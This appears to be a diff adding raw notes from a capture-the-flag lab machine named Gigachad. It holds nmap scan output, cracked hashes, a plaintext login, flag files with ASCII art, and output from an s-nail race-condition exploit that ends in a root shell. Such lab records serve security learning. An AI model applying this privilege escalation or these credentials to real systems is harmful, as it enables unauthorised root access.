@@ -1,0 +1,139 @@
+root@kali:~/CTF/Gigchad# nmap -A -p- 192.168.43.190
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-12 22:25 CEST
+Nmap scan report for 192.168.43.190
+Host is up (0.0011s latency).
+Not shown: 65532 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-r-xr-xr-x    1 1000     1000          297 Feb 07 17:33 chadinfo
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:192.168.43.254
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 6a:fe:d6:17:23:cb:90:79:2b:b1:2d:37:53:97:46:58 (RSA)
+|   256 5b:c4:68:d1:89:59:d7:48:b0:96:f3:11:87:1c:08:ac (ECDSA)
+|_  256 61:39:66:88:1d:8f:f1:d0:40:61:1e:99:c5:1a:1f:f4 (ED25519)
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+| http-robots.txt: 1 disallowed entry 
+|_/kingchad.html
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Site doesn't have a title (text/html).
+MAC Address: 08:00:27:F8:9C:32 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE                                                                                                                                                                                                                                 
+HOP RTT     ADDRESS                                                                                                                                                                                                                        
+1   1.13 ms 192.168.43.190                                                                                                                                                                                                                 
+                                                                                                                                                                                                                                           
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                                                                      
+Nmap done: 1 IP address (1 host up) scanned in 12.11 seconds     
+
+
+
+
+
+A7F9B77C16A3AA80DAA4E378659226F628326A95	sha1	fuck you
+D82D10564866FD9B201941BCC6C94022196F8EE8	sha1	VIRGIN
+
+
+
+chad:maidenstower
+
+
+
+
+chad@gigachad:~$ 
+chad@gigachad:~$ cat user.txt 
+flag 1/2
+░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄
+░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄
+░░░░█░░░░░░░░░░░░░░░░░░░░░░█
+░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█
+░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█
+█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█
+█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█
+░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█
+░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█
+░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█
+░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█
+░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█
+░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█
+░░░░░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█
+░░░░▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█
+░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀
+░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄
+░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█
+░░█░░▌░█░░█░░█░░░█░░█░░█
+░░█░░▀▀░░██░░█░░░█░░█░░█
+░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█
+
+
+
+chad@gigachad:~$ 
+
+
+
+  It cannot be run by itself.
+[.] Race #200 of 1000 ...
+This is a helper program of "s-nail" (in /usr/bin).
+  It is capable of gaining more privileges than "s-nail"
+  and will be used to create lock files.
+  It's sole purpose is outsourcing of high privileges into
+  fewest lines of code in order to reduce attack surface.
+  It cannot be run by itself.
+[.] Race #201 of 1000 ...
+[+] got root! /var/tmp/.sh (uid=0 gid=0)
+[.] Cleaning up...
+[+] Success:
+-rwsr-xr-x 1 root root 14424 Apr 12 17:43 /var/tmp/.sh
+[.] Launching root shell: /var/tmp/.sh
+# id
+uid=0(root) gid=0(root) groups=0(root),1000(chad)
+# cd /root
+# ls
+chad_real_identity.png  root.txt
+# cat root.txt
+flag 2/2
+░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄
+░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄
+░░░░█░░░░░░░░░░░░░░░░░░░░░░█
+░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█
+░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█
+█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█
+█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█
+░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█
+░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█
+░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█
+░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█
+░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█
+░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█
+░░▐▌░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█
+░░░█▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█
+░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀
+░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄
+░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█
+░░█░░▌░█░░█░░█░░░█░░█░░█
+░░█░░▀▀░░██░░█░░░█░░█░░█
+░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█
+
+congratulations!
+
+
+
